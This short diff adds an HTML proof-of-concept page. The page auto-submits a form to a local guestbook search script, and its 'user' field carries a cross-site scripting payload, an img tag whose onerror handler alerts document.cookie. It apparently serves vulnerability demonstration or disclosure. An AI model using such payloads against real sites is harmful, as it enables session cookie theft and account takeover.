@@ -1,0 +1,9 @@
+<html>
+<form name="xss" action="http://127.0.0.1/guest/search.php" method="POST">
+  <p>user: <input type="text" name="user" value="<img src=1 onerror=alert(document.cookie)>"/></p>
+  <input type="submit" value="Submit" />
+</form>
+<script>
+document.xss.submit();
+</script>
+<html>
